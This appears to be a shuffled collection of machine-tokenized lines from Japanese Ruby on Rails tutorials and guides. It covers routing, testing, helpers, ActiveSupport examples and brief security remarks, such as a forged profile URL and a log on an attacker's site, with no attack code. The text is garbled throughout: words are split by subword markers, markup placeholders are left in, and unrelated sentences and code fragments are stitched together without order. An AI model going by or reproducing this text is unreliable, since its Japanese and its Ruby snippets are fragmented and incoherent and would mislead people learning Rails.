▁NOTE : ▁Rails の ルーター では 、 サーバー への リクエストを マッチ させる 際に HTTP 動詞 と URL を使用している ため 、 4 種類の URL ▁( GET / POST / PATCH / DELETE ) ▁ が 7 種類の 異なる アクション ▁( index / new / create / show / edit / update / destroy ) ▁ に割り当てられ ています 。
▁この まま でも 支 障 はありません が 、 や は り このような 例外 には 頼 らない 方が よい ので 、 上で は ひ と 手 間 かけて セキュリティ のための レ イ ヤ ー を追加し ました 。
▁ 本書 では RSpec と Capybara を テスティング の メ イン に 据 え ているので 、 この節 の Cucumber に関する 説明 は 完 全 ではなく 、 表 面 的 で 物 足 り ない ことでしょう 。
▁ 指定された オブジェクト と メソッド に従って 、 select タグ の中に 一連の option タグ を 含 んだ もの を作成します 。
▁この 返 信 機能 の 簡単な バージョン を実装 してみましょう ▟ 具体的には 、 @ reply は 受 信 者 の フィード と 送信 者 の フィード に のみ 表示される ようにします 。
▁ユーザー登録 に必要な 情報 を入力する
▁ エンジンの アセット は 、 通常の アプリケーション で使用される アセット と まったく 同じ ように 機能 します 。
▁この節では 、 Rails の コントローラと アクション を使って 3 つの 有効な ページ を生成する ことで さまざまな ことを 達 成 しました ▟ しかし それら は 単純な 静的ページ であり 、 また Rails の 能 力 を 十分 に 発 揮 でき て いません 。
▁number _ to _ percentage ( 10 0, ▁ precision : ▁0 ) ▁# ▁=> ▁100 %
▁ 今回は 少しだけ 面倒な 点 があります ▟ メールアドレスを キー として ユーザー を検索する ということは 、\ k ode { edit } アクションと \ k ode { update } アクション の両方 で メールアドレス が必要になる ということです 。
▁ 有効な オブジェクトに対して テストを書く ために 、\ k ode { setup } という 特殊な メソッドを使って 有効な User オブジェクト ▁(\ k ode {@ user }) ▁ を作成します ▁( このメソッドは {1} {2} 第 3 章 {/2}{/1} の演習 でも 少し 取り上げ ました )▟ setup メソッド 内に 書かれた 処理 は 、 各 テストが 走 る 直前に 実行されます ▟\ k ode {@ user } は インスタンス変数 ですが 、 setup メソッド 内で 宣言 しておけば 、 すべての テスト 内で この インスタンス変数 が 使える ようになります ▟ したがって 、\ k ode { valid ?} メソッドを使って User オブジェクトの 有効 性 をテストする ことができます ▁(\ ref { sec : creating _ user _ objects }) ▖ 。
▁ 私 のために も 読者 の 皆 様 のために も 、 後 者 であること を 祈 ります 。
▁< option ▁value =" 3 "> M ▖ ▁Clark </ option >
▁=> ▁false
▁ { p 0} の 表 { p 2 } を元に 、 より 一 般 性 の高い {3} authenticated ? {/3} メソッド を定義する ことにします 。
▁ コメント にも ある ように 、 上のコード はまだ 実装 が 完了 していません ので 注意してください 。
▁| ▁GET ▁| ▁ / geocoder / new ▁| ▁ geocoder s # new ▁| ▁ geocoder 作成 用の HTML フォーム を返す ▁|
▁また 、 テスト ファイル だけで なく 、\ k ode { home ▖ html ▖ erb } ファイル が変更され ると \ k ode { static _ pages _ test ▖ rb } が自動的に 実行される ように Guard を設定する こともできます 。
▁ 失 礼 、 その 2 はありません 。
▁このとき ` search _ photos _ url ` や ` search _ photos _ path ` ルーティングヘルパー も 同時に 作成されます 。
▁この 攻 撃 では 「 login _ home _ index _ html 」 という 名前 を URL に 持つ プロファイル ページ が 捏 造 され 、 それによって この URL は ユーザー から は 実に もっと も ら しく 見え ました 。
▁ パスワード 機 構 という パ ズ ル の 最後の ひ と かけ ら は 、 ユーザーを メールアドレス と パスワード に基いて 取得 する手段 です 。
▁-------------- ---------------
▁gem ▁' coffee - rails ', ▁' ~ > ▁3▖1 ▖ 1 '
▁ パーシャル を使用すると 、 レスポンス で 表示する ページの 特定 部分を レンダリング するための コードを 別 ファイル に保存 しておく ことができます 。
▁` config ▖ middleware ▖ use ` メソッドを使用すると 、 上 記 以外に 独自の ミドルウェア を追加する こともできます 。
▁ ハッシュの キー として シンボル を採用する 場合 、\ k ode { user } ▁ の ハッシュ は以下のように 定義 できます 。
▁このコードは / users / t ig ers という URL に 応答 します ▁( アプリケーション にある すべての t ig er の リスト を表示します )
▁このガイドでは Rails アプリケーションで 利用 可能な 設定 と 初期化 機能 について 説明 いた します 。
▁この 図 式 は 、 すべての ▁Ruby ▁ の オブジェクト において 成り立 ち ます ▟ クラス 階層 を た ど って い く と 、 ▁Ruby における すべての クラスは 最終的に ス ー パ ー クラスを 持 た ない \ k ode { BasicObject } クラス を継承し ています 。
▁\ k ode { validates ▁: uniqueness } を使用して も 、 一意性 は 保 証 されません 。
▁ こちら の場合は 、 結合 モデル を使用した 間 接 的な 関連付け が使用されます 。
▁ ユーザーを フォローする データモデル 構成 のための 第 一 歩 として 、 典型的な 場合 を 検 討 してみましょう 。
▁ 基本的に これらの メソッドは 、 通常の ビュー では 使用 しないでください 。
▁config ▖ after _ initialize ▁do
▁ アップグレード の 手順 は 、 Rails のバージョン ごとに 個 別 に 記載 されています 。
▁このメソッドは 内部で ` stylesheet _ path ` を呼び出し ており 、 現在の ホスト または アセット 用の ホスト と マージ して URL を生成します 。
▁Users コントローラの \ k ode { show } アクション
▁( このとき 、\ k ode { order } メソッドを 経 由 することで 、 明示的に 最初の ▁( ID が 小さい 順に ) ▁6 人 を呼び出す ようにしています ▟)
▁{" a " ▁=> ▁1, ▁a : ▁2}▖ symbolize _ keys
▁リスト \ ref { code : a _ test _ for _ invalid _ submission } と同じ ファイルに \ k ode { assert \_ difference } を使った テスト を追加する と 、 リスト \ ref { code : a _ test _ for _ valid _ submission } のようになります 。
▁* ▁` where `
▁* ▁` d is able _ dependency _ load ing `: ▁` config ▖ eager _ load ` が true の場合は 自動 依 存 性 読み込み ( auto ma tic ▁ dependency ▁loading ) を 無効 に します 。
▁# ▁ SELECT ▁id ▁FROM ▁clients ▁WHERE ▁active ▁= ▁1
▁ 親 オブジェクト が保存され た場合 は 、 子 オブジェクトは 保存されます 。
▁ 指定 できる 値は `: c lo sure `、`: uglifier `、`: yui ` です ▟ それぞれ ` c lo sure - compile r `、` uglifier `、` yui - compressor ` ▁gem に 対応 します 。
▁Person ▖ id s
▁ この後 も 、 本チュートリアル を 進 め ながら アプリケーションを こ ま め に プッシュ / デプロイ する ことをおすすめします ▟ こうすることで リモート バ ッ ク アップ にも なり 、 production 環境で の エラーを 早 め に 確 認 することもできます ▁( 訳 注 : ▁最後に まとめて プッシュ / デプロイ すると 問題 が 同 時 多 発 して 解決 に 手 間 取ること が考えられます ) 。
▁ 伝 統 的な ` gem ▁install ` コマンド 実行時に 同時に インストール される 必要のある gem を指定する には 、 以下のように エンジンの ` ▖ gem spec ` ファイル にある ` Gem :: Specific ation ` ブロック の 内 側 に記述 します 。
▁この 例 では 、 作成された コメント の 横 に 小さな 数字 を表示する の に 使用 しています 。
▁* ▁` ActionDispatch :: Request I d ` は 、 レスポンス で 使用できる 独自の X - Request - I d ヘッダー を作成し 、` ActionDispatch :: Request # u u id ` メソッド を有効に します 。
▁ 結果 として 、 Rails はこの 4 つの HTTP リクエスト ▁(\ text tt { GET } ・ \ text tt { POST } ・ \ text tt { PATCH } ・ \ text tt { DELETE }) ▁ を 全て サポート できるようになりました 。
▁ monday
▁このとき 、 既に ログイン 済み の ユーザーを 対象 と している ため 、 ログイン ページ ではなく � ルート URL にリダイレクトし ている 点に注意 してください 。
▁ このテストは 、 ユーザー登録ページ を ブラウザで 表示 し 、 ユーザー登録 情報 に 何も 入力 しない まま 送信する 操作 ▁( 無効な 操作 ) ▁ と 同等です 。
▁# ▁ 日時 の 指定 がない場合 、 本 日 を デフォルト値 と する 日時 セレクト ボックス を生成する
▁ サンプルアプリケーション に Contact ▁( 問い合わせ 先 ) ▁ ページ を作成してください 。
▁\ ref { sec : requiring _ logged _ in _ users } では 、 ログイン していない ユーザーが 保 護 された ページ にアクセス し ようとした 際の ケース について 対 処 していきます 。
▁\ href { http :// s ivers ▖ org } { D er e k ▁S ivers } が 前 書き で 述 べ ている ように 、 本書 は 一 本 道 の ストーリー で 構成 されて いて 、 最初から 最 後 まで 飛 ば さ ずに 読む ことを 前提と しています 。
▁ 実は 小さな バグ が 2 つ 残 っています ▟ 2 つの バグ は 互 い に 強く 関連 しています 。
▁ これによって 、 現在のユーザー が 管理者 の ときに 限り ▁\ k ode { [ delete ]} ▁ リンク が表示される ようになります ▁( リスト \ ref { code : delete _ links }) 。
▁ 必要であれば 、 デフォルトの カラム名 を 以下のように オーバーライド できます 。
▁"2010-07-27 "▖ to _ date ▁# ▁=> ▁Tue , ▁ 27 ▁Ju l ▁2010
▁ コマンドライン について 話 し だ す とき り が ないので 深 入 り は しません が 、 本チュートリアル で 必要な Unix コマンドライン の コマンドは ほんの わずか しか ありません ので ご 安 心 ください ▁( 表 \ ref { table : uni x _ commands }) 。
▁create ▁app / assets / javascripts / welcome ▖ js ▖ coffee
▁Cucumber では 、\ href { https :// github ▖ com / cucumber / g her k in } { G her k in } ▁( キ ュ ウ リ 属 の 植 物 : ▁ ガ ー キ ン ) ▁ と呼ばれる テキスト ベースの 言語 を使用して 、 アプリケーションに 期 待 される 振る舞い を記述し ます 。
▁ テスト駆動開発 は 、 この種の 地 味 な バグ 修正 には う って つ け です ▟ そこで 、2 つの エラーを キャッチ する テストを書く ことにします 。
▁**` ActionDispatch :: Re load er ` **
▁\ ref { sec : adding _ to _ the _ layout } で 述べたように 、 これらの クラスの 多く は 、 Twitter が 作成した フレームワーク である \ href { http :// get bootstrap ▖ com /}{ Bootstrap } 特有の ものです ▟ Bootstrap を使用すると 、 洗 練 された Web デザイン と ユーザー インターフェイス 要素 を簡単に HTML 5 アプリケーション に追加する ことができます 。
▁[ remember ▁me ] ▁ チェックボックス を ログインフォーム に追加する
▁now ▁= ▁ DateTime ▖ now ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁ 19 : 30 : 4 7 ▁- 0 400
▁ expire s ▁1 y ;
▁{0} 図 5 ▖ 8 {/0} ▁{1} \ href { http ://0▖0▖0▖0:3000/ about }{/ about } で表示される About ページ {/1}
▁ この問題 の 修正 するには と て つ も なく 複雑な 正規表現 を使う 必要があります が 、 これは 演習 問題 に回します ▁(\ ref { sec : modeling _ users _ exercises }) 。
▁edit フォーム は Active ▁Record モデルオブジェクト ▁( ユーザー など ) ▁ を変更する ので 、 エラーメッセージ の 出力 に リスト \ ref { code : password _ reset _ form } の一部 を 共有 できます 。
▁その 他にも 、 アプリケーションの コード と 比 べ て テストが どの ぐらい 書き にくい か 、 必要な 機能を どの ぐらい 正確に 把 握 している か 、 その 機能 が 将来 廃 止 される 可能性 が どの ぐらい ある か によって も 異 な って く る でしょう 。
▁{0} 図 2 ▖6{/0}{1} ユーザー 表示 用の ページ ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 })▟ \ href { http :// railstutorial ▖ org / images / figures / demo _ show _ user _ rails _ 3- full ▖ png }{( 拡大 ) }{/1}
▁ 先 の例では 、 コントローラ 名 が " projects " で 、` app / assets / javascripts / projects ▖ js ▖ coffee ` ファイル と ` app / assets / stylesheets / projects ▖ css ▖ scss ` ファイル が生成されます 。
▁ 何らかの 理由 で 、 エスケープ されていない 文字列 を挿入 したい場合は 、` html _ safe ` を呼ぶ の ではなく 、` raw ` ヘルパー を使用する ようにしてください 。
▁上の コマンドで は \ k ode { password \_ digest : string } という 引数 を与え て 、 今回 必要 になる 属性 名 と 型 情報を 渡 しています 。
▁{0}{1} 図 4 ▖ 2 {/1}{/0} に この クラス 階層 を示します 。
▁` validates _ with ` には デフォルトの エラーメッセージ はありません 。
▁ 必要な User モデルオブジェクト を作成する ために 、 Active ▁Record を使用して \ k ode { User ▖ create } という 形式で ユーザー を作成する こともできます が 、 経験 上 、 ユーザーの オブジェクトを 定義 して それを データベースに 挿入する には 、 ユーザーの \ emph { ファクトリー ▁( factory )} ▁ を使用する 方が は る か に 便利です 。
▁リスト \ ref { code : relationships _ controller } でも 説明します が 、 Relationship s コントローラのアクション で アクセス制御 することは そこ まで 難 しく ありません ▟ しかし 、 前 回 の アクセス制御 のときと同様に 最初に テストを 書き 、 それを パス する ように 実装 することで セキュリティ モデルを 確 立 させ ていきましょう 。
▁\ href { http :// www ▖ got ealeaf ▖ com / railstutorial } { T ealeaf ▁A c a de my } : ▁ オンライン で 受 講 できる Rails 開発 ブ ート キャン プ です ▟ 高度な 資 料 も 充 実 しています 。
▁つまり 、 以下のコード は
▁( 最初の 行 は master ブランチ から 作業を 始 め る ことを確認する ためのものです ▟ そして 、\ k ode { modeling - users } トピックブランチ は \ k ode { master } ブランチ を 基 に 作成します 。
▁### ▁` belongs _ to ` と ` has _ one ` のどちら を 選 ぶ か
▁render ▁ inline : ▁"< % ▁ products ▖ each ▁do ▁| p | ▁%>< p > <%= ▁p ▖ name ▁%></ p >< % ▁end ▁%> "
▁ アプリケーションの コード は既に 動作する ようになってい るので 、 ここで テスト を実行すると ▁\ passing ▁ になるはずです 。
▁email _ field _ tag ▁' email '
▁ 以下のように 、 他の フォルダ の下に ある パーシャル を呼び出す 際に も アンダースコア は 不要 です 。
▁{0} 図 9 ▖ 1 {/0} {1} ユーザー編集ページ のモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / edit _ user _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ アプリ を作成 していない のであれば 、 先に \ k ode { heroku ▁create }、\ k ode { git ▁push ▁ heroku ▁master } を実行して から 上の コマンド 操作を 実行 してください ▟)
▁ 残念ながら 、 少々 ズ ル も しています 。
▁ 以下の行 は 、
▁従って 、 ユーザー 作成 に 成功 したときに メールを送信 するよう コントローラ から メイラー に 指示 するだけで 機能 するようになります 。
▁(\ ref { sec : users _ index } で これを 改 善 した ヘルパー を使います )
▁def ▁to _ check _ box _ tag ( options ▁= ▁ { }, ▁check ed _ value ▁= ▁ "1" , ▁un check ed _ value ▁= ▁" 0 ")
▁\ k ode { | i | } では 変数 名 が 縦 棒 「 | 」 に 囲 まれ ています が 、 これは ブロック 変数 に対して 使用する Ruby の 構 文 で 、 ブロック を 操作 するときに 使用する 変数 を指定します 。
▁これらの パラメータ を使い やすくするため に 、\ k ode { user _ params } という 外部 メソッド を使用する のが 慣習 になっています ▟ このメソッドは 適切に 初期化 した ハッシュ を返し 、\ k ode { params [: user ]} の 代 わ り として 使用されます 。
▁assemblies ▖ build ( attributes ▁= ▁ { }, ▁ ▖▖▖)
▁before フィルター で \ k ode { destroy } アクションを 管理者 だけ に 限 定 する
▁` where ` オプションで ハッシュ を使用した 場合 、 この 関連付け で 作成された レコード は自動的に この ハッシュ を使用した スコープ に含まれる ようになります 。
▁: format s => [: html ] , ▁: locale => [: en , ▁: en ]} ▖
▁本章では 、 今後 の チュートリアル を 楽 に 理解 できるように 、 簡単な サンプルアプリケーション を 開発 してみます 。
▁ assert _ recognizes ( { ▁controller : ▁' photos ', ▁action : ▁' show ', ▁id : ▁'1' ▁ }, ▁' / photos /1 ')
▁# ▁=> ▁[[1, ▁' David '] , ▁[ 2, ▁' Jeremy '] , ▁[ 3 , ▁' J o se ' ]]
▁この 方法 を使うと 、 たとえば 以下のような
▁* ▁` ActionDispatch :: Cookie s ` は リクエスト に対応する cookie を設定します 。
▁Action ▁Mailer では ` before _ action `、` after _ action ` および ` ar ound _ action ` という コールバック を指定できます 。
▁ テストコード を 最大 限 に 柔 軟 にする ため 、\ k ode { log _ in _ as } メソッド ▁( リスト \ ref { code : test _ helper _ log _ in }) ▁ では \ k ode { options } ハッシュ ▁( リスト \ ref { code : gravatar _ option }) ▁ を引数に取り 、 パスワード と ▁[ remember ▁me ] ▁ チェックボックス の デフォルト値 をそれぞれ \ k ode { ’ password ’} と \ k ode { ’ 1 ’} に設定し ます 。
▁* ▁Rails ▁4▖0 では 、 名前付きルート の定義 が 重複 している場合 に ` ArgumentError ` が発生する ようになりました 。
▁ アセットパイプライン の もうひとつ の 機能 は アセット の 最小化 ▁( 一種の 圧縮 ) ▁ です 。
▁この リンクをクリックすると 、 背 景 が 赤 く なります 。
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' pending '
▁ shallow ▁do
▁ www ▖ attacker ▖ com ▁ サイト 上の ログ ファイルに は以下のように 記 録 されます 。
▁Ruby は 巨 大 な 仕 様 を持つ 言語 ですが 、 幸 い 、 Rails 開発者 にとって 必要な 知識 は 比 較 的 少 なく て 済み ます 。
▁` cache s _ action ` コントローラ マクロ で の定義 を例にとって 見 てみましょう 。
▁ dup ▁= ▁array ▖ deep _ dup
▁Client ▖ select (: id )▖ map ▁ { ▁| c | ▁c ▖ id ▁ }
▁しかし 早く も ここで 問題が生じ 始 め ます ▟ クリック した 時に JavaScript で もっと い ろ ん な ことを させる と どう なる でしょうか 。
▁この アセット への リクエスト は 、 Sprockets ▁gem によって 提供され ます 。
▁まずは 、 {0}{1} 第 3 章 {/1}{/0} の演習 で 取り上げ た Contact ページ について 追加 しましょう 。
▁% w ( a ▁b ▁c ▁d )▖ from (10) ▁# ▁=> ▁[]
▁ その他の 変更 は リポジトリ に コミット しましょう ▟ その後 、 Bitbucket に プッシュ し 、 Heroku に デプロイ しましょう 。
▁ 完全な リスト については [ API ドキュメント ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers ▖ html ) を参照してください 。
▁たとえば 、 作り 直 した カ レ ン ダ ー 内で 正しく ジ ャ ン プ できます 。
▁### ▁ Flash 構造 の 変更
▁{0} 図 8 ▖8{/0}{1} \ k ode { remember _ token } 属性 を追加した User モデル ▟ {/1}
▁この 6 人 については 、1 ページの 表示 限 界 数 ▁( 30 ) ▁ を 越 え させるため に 、 それぞれ 50 個 分 のマイクロポスト を追加する ようにしています 。
▁ 本チュートリアル の 前の エ デ ィ ション では 、 オープンソース コードの サポート を 強 調 する GitHub を採用し ていました ▟ しかし チュートリアル の 目的 には 、 Web アプリケーションの \ emph { 全 } リポジトリ が デフォルトで 非 公開 になっている 方が セキュリティ 上 好 都 合 です 。
▁< h 1> Product s </ h 1>
▁ 今回は 、 こういった メソッドは テスト から 先に 書いていきます 。
▁table _ name ▁= ▁class _ name ▖ to _ s ▖ demodulize ▖ underscore
▁### ▁C HA N G E LO G の 更新
▁ 利用 環境 の セキュリティ
▁{0} リスト 2▖1 {/0} ▁╼╼{1} To y アプリケーション 用の \ k ode { Gemfile }{/1}
▁1234567890 123 ▖ to _ s (: human _ size ) ▁# ▁=> ▁1▖ 12 ▁T B
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / k ernel / singleton _ class ▖ rb ` です 。
▁ 従来 の テストでは 、 た った 1 つの テストを実行 するだけで も 、 Rails の 環境 に 匹敵 する オ ー バー ヘ ッ ド が発生し てしまい ました ▟ このため 、 上 述 のテスト 用 コマンド と Spork の 組み合わせ は非常に 相 性 が 良い のです ▟ Spork は 、 テスト を実行する たびに 発生 して いた テスト 環境 起動 による オ ー バー ヘ ッ ド を 取り 除 い てくれる ため 、1 つの テスト を実行する たびに すべて をテストする の と 同 程 度 の オ ー バー ヘ ッ ド が発生する ような ことが なくなります 。
▁text _ field _ tag ▁' name '
▁続いて 現在 インストール されている Ruby のバージョン が 最新の もの である ことを確認してください 。
▁ コンピュータ に してみ れば どんな に 汚 ら しい コード で あ ろ う と 、 そこに ある が まま に 実行する だけです が 、 人 間 は そう い う わ け には い き ません ▟ こ ま め に リファクタリング を 繰り返し て コードを 常に す み ず み まで 美 しく コンパクト に 保 ち 、 他の 開発者 や 未 来 の 自分の 開発 意 欲 を 阻喪 す ることのないように し なければなりません 。
▁# ▁=> ▁Fri , ▁ 15 ▁Oct ▁ 1582
▁create ▁db / migrate / [ timestamp ] _ create _ blorgh _ comments ▖ rb
▁特定の属性にアクセスするための 、 種類 が " password " の input タグを返します 。
▁module ▁ Class Methods
▁ ファイル の作成 方法は システム の設定 によって さ ま ざ ま ですが 、 た いて い の テキストエディタ では 、 ディレクトリ を Ctrl + クリック すれば コンテキスト メニュー に ▁[ New ▁File ] ▁ や ▁[ ファイルを 作成 ] ▁ などの メニュー が表示されます 。
▁╼╼ ▁\ subsection { ユーザーの モデル 設計 } ▁% ▁( fold )╼ ▁\ label { sec : modeling _ demo _ users }╼╼
▁number _ to _ human _ size ( 123 4 ) ▁# ▁=> ▁1▖ 2 ▁ K B
▁これは 、 HTTP の 仕 様 として 定義されている \ text tt { HTTP _ RE F ER ER } と 対応 しています ▟ ▁ ちなみに ▁“ referer ” ▁ は 誤 字 ではありません ▟ 仕 様 では 確 か に この ( 間違った ) ス ペ ル を使っている のです 。
▁このメソッドは 、 シンボル と 文字列 が 両方 含 まれ ている ハッシュ を オプション として 受け取る 場合に 便利な ことがあります 。
▁ assert _ recognizes ( { ▁controller : ▁' photos ', ▁action : ▁' create ' ▁ }, ▁ { ▁path : ▁' photos ', ▁method : ▁: post ▁ })
▁ それ に 、 ユーザー名 も すべて 異なる もの に しておく 方が テストの 際に 便利です 。
▁ 最大 接続 数 はデフォルトで 5 ですが 、` database ▖ yml ` で カスタマイズ 可能です 。
▁ ついに アカウントの有効化 を実装 で きました ▟ き り の よい 所 で Git に コミット しておきましょう 。
▁def ▁index
▁ユーザー登録 失敗 時の デバッグ情報 ▟\ href { http :// railstutorial ▖ org / images / figures / signup _ failure _ rails _ 4 _ debug - full ▖ png }{( フル サイズ )}
▁ マイクロポスト を作成する ▁( 失敗した場合 は 例外を発生 する ) 。
▁ この後 で説明します が 、 この 方法 では た ち ま ち 壁 に 突 き 当 た ってしまいます ▟ これ を解決する ための \ k ode { has _ many ▁through } ▁( 多 対 多 の関係 を表す の に 使用 ) ▁ についても この後 で説明します 。
▁ セキュア パスワード の 完全な 実装 ▁( ▁\ passing ▁ )
▁上の どの メソッドを 実行 した 場合にも 、\ k ode { a } 自身 は 変更 されていない という 点にご注目ください 。
▁created _ at : ▁"2013-03- 12 ▁ 05 : 51 : 34 ", ▁updated _ at : ▁"2013-03- 12 ▁ 05 : 51 : 34 ",
▁@ article ▁= ▁Article ▖ new ( params ▖ require (: article )▖ permit (: title , ▁: text ) )
▁ 文法 は 一見 奇 妙 ですが 、 動作 は 変数 への 割り当て と似ています 。
▁self を省略した 結果を リスト \ ref { code : protected _ index _ test } に示します 。
▁`: host ` オプションを グローバル に設定し ていない 場合は 、` url _ for ` に `: host ` オプション を明示的に 渡す 必要がある ことにご注意ください 。
▁ 何も 出力 しない という レスポンス は 、 Ajax リクエスト を使用する 時に 便利です ▟ これ を使用することで 、 リクエスト が成功した という 確 認 応答 だけ を ブラウザに 送 り 返す ことができる からです 。
▁次に 、 すべての ユーザーを 一覧 できるようにします ▁( もちろん 認 証 を要求します )▟ これは サンプル データ と ページネーション ▁( p a g n ation ) ▁ を導入する 動 機 にも なります 。
▁ ファイル の種類 ご と の 正しい 置き場所 については 、[ アセット の 編 成 ](# アセット の 編 成 ) を参照してください 。
▁If ▁you ▁need ▁to ▁use ▁` return ` ▁statement s ▁in ▁your ▁callbacks , ▁it ▁is ▁recommended ▁that ▁you ▁explicitly ▁define ▁them ▁as ▁methods ▖
▁この節で 行った ような ち っ ぽ け な リファクタリング です ら 、 実際に や っ てみると 大 小 さまざまな エラーが発生し ます ▟ ベ テ ラン 開発者 ほど この ことを 骨 の 髄 まで 理解 し ており 、 どんな 小さな リファクタリング でも あ など った り しません 。
▁リスト \ ref { code : image _ upload _ test } に 示す テンプレート を参考に 、\ ref { sec : micropost _ images } で実装した 画像 アップ ロー ダ ー を テスト してください 。
▁WARNING : ▁ 数字 については 空白 である かどうか は 判 断 されません 。
▁これは ハッシュの キー として 理想 的な 性 質 です 。
▁ どの 場合 であっても 、 ホスト ▁( ` http :// www ▖ example ▖ com ` など ) ▁ が URL の冒頭 で 指定 されていない 場合は 、 Rails は ▁( 以前の リクエスト ではなく ) ▁ 現在の リクエスト から 詳 細 を取得し ます 。
▁この 指定 を 文法 化 するために 、` require ` メソッドと ` permit ` メソッドが 導 入 されました 。
▁ 技術 的に は 、 メールアドレス のうち ドメイン 名 部分 だけ が ▁( 本 当 は ) ▁ 大文字 小文字 を 区別 しません ▟\ emph { foo @ bar ▖ com } は 、 本 来 は \ emph { Foo @ bar ▖ com } とは 別の アドレス です 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ id ▁= ▁10 ) ▁LIMIT ▁1
▁Rails の セキュリティ 関連の 追加 リソース をご紹介します 。
▁class ▁E mail Validator ▁< ▁ ActiveModel :: Each Validator
▁d ▖ next _ month ▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010
▁Contact ページ のテスト
▁この ハッシュ は Users コントローラに \ k ode { params } として 渡 されます ▟\ ref { sec : a _ users _ resource } で 説明したとおり 、 この \ k ode { params } ハッシュ には 各 リクエスト の 情報 が含まれています 。
▁この まま でも 支 障 はありません が 、 や は り このような 例外 には 頼 らない 方が よい ので 、 上で は ひ と 手 間 かけて セキュリティ のための レ イ ヤ ー を追加し ました 。
▁create _ table ▁: patients ▁do ▁| t |
▁ 統合テスト が成功した ら 、 今度は すべての テストを 流 して {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} する かどうか 確かめ てみてください 。
▁ 他の プログラミング言語 や フレームワーク を使用して アプリケーション を作成する と 、 設定 のための コードを 大 量 に 書く 必要 が生じ が ち です 。
▁しかし JavaScript には どんな 文字列 も コード として 実行 でき てしまう eval () 関数 があります ▟ この 関数 は 強 力 ですが 危 険 です 。
▁self を省略した 結果を リスト \ ref { code : user _ following _ test } に示します 。
▁### ▁ ローカル で プリコンパイル を行なう
▁まずは ユーザー の一覧を表示 する \ href { http ://0▖0▖0▖0:3000/ users }{\ text tt { index } } ページ を見てみましょう ▟ もちろん 、 この時点で はまだ ユーザーは 登録 されていません ▁( {2} {3} 図 2▖ 4 {/3} {/2} ) 。
▁` DateTime ` の拡張
▁上のコードは 以下のように 変更 する必要があります 。
▁#### # ▁` group `
▁def ▁some _ class _ method
▁ ╼╼% ▁subsection ▁user _ index _ test ▁( end )╼╼ ▁\ subsection { パーシャル の リファクタリング } ▁% ▁( fold )╼ ▁\ label { sec : partial _ refactoring }╼╼
▁図 \ ref { fig : user _ model _ password _ digest } の データモデル を もう一度 見 てみると 、\ k ode { password \_ digest } 属性を ユーザーの フィクスチャ に 追加 すれば よい ことがわかります ▟ そのために 、\ k ode { digest } メソッドを 独自 に 定義 する ことにします 。
▁#### ▁ テンプレート を キャッシュ する
▁上の セ レ ク タ は 、\ k ode { < title > } タグ 内に 「 Home ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App 」 という 文字列 があるかどうかをチェック します 。
▁ ユーザ のマイクロポスト の順序 をテストする 。
▁( 注 : ▁\ k ode { form _ for } の代わりに \ k ode { form _ tag } を使う ことも でき 、 Rails では この 方が 慣 用 的な 方法 です ▟ しかし 、 ユーザー登録フォーム では form _ for を使用する 方が 一般的 であり 、 並 列 構造 を 強 調 するために も form _ for を使用しました 。
▁なお 、 古 い ブランチ では ビルド の ター ゲ ッ ト が master と 異なる セット になっている 場合 があります のでご注意ください 。
▁Rails とは 何か
▁これは 、 Rails では コントローラの インスタンス変数 はすべて ビュー に 渡される よう になっている からです ▁( 訳 注 : ▁Rails は そのために 背 後で インスタンス変数 を コントローラ から ビュー に 絶 え 間 なく コピー し 続けて います ) 。
▁* ▁" 条件 付き ▁` GET ` " ▁( Conditional ▁` GET ` ) ▁ 機能 を提供します ▟ " 条件 付き ▁` GET ` " が有効になってい ると 、 リクエスト された ページに 変更 がない ときに 空の body を返す ようになります 。
▁ 対象 となる ルーティング はすべて 初 め から ア ン カ ー されているので 、 このような ア ン カ ー 表現 を使用する 必要はない はずです 。
▁root ▁' welcome # index '
▁これは 、 たとえば 中 断 した バッチ 処理 を再 開 する 場合 など に 便利です ▁( 最後に 実行 された 処理 の ID が チェック ポイント として 保存 済み であること が 前 提 です ) 。
▁ 本 セクション では 、 エンジン を アプリケーションに マウント して 必要な 初期 設定 を 行い 、 アプリケーション が提供する ` User ` クラス に エンジン を リンク して 、 エンジン 内の 記事 と コメント に 所有 者 を与える ところ まで をカバー します 。
▁ 出力 時に レイアウト を まったく 使用 しないよう 指定することもできます 。
▁ 新規 のマイクロポスト が この 方法で 作成される 場合 、\ k ode { user \_ id } は自動的に 正しい 値 に設定されます 。
▁=> ▁[" a ", ▁" b ", ▁" c ", ▁" d ", ▁" e "]
▁t ▖ string ▁: name
▁self を省略した 結果を リスト \ ref { code : about _ route } に示します 。
▁### ▁ パーシャル
▁` app / views / blorgh / articles / index ▖ html ▖ erb ` という ファイル を作成する ことで 、 上の 動作 を上書き することができます 。
▁ 設定 に与える オブジェクト には ` compress ` メソッドが 実装 されている 必要があります ▟ このメソッドは 文字列 のみ を 引数として 受 け 取り 、 圧縮 結果を 文字列 で 返す 必要があります 。
▁### ▁N um b er Helper
▁* ▁ 略 語 を除いて すべての 単語 を 小文字 に します ( downcase ) 。
▁TIP : ▁ 出力結果 を ブラウザで 表示 して 調 べ ること なく 、` render ` 呼び出し の 正 確 な 結果を 取得 したい場合は 、` render _ to _ string ` を呼び出す ことができます 。
▁詳細については [ この pull ▁request ]( https :// github ▖ com / rails / rails / pull /1 3 27 1 ) を参照してください 。
▁このコードは 、\ k ode { follow } と \ k ode { unfollow } の パーシャル に 作業を 振 っている だけです ▟ パーシャル では 、 Relationship s リソース 用の 新しい ルーティング が必要です ▟ これを 、 リスト \ ref { code : microposts _ resource } の Microposts リソース の例 に従って 作成 しましょう ▁( リスト \ ref { code : relationships _ resource }) 。
▁date ▖ since (1) ▁# ▁=> ▁Fri , ▁ 11 ▁Jun ▁2010 ▁ 00 :00 : 0 1 ▁E D T ▁- 04 :00
▁route ▁get ▁" static _ pages / home "
▁### ▁Active ▁Record パターン
▁以下の シナリオ を見 てください 。
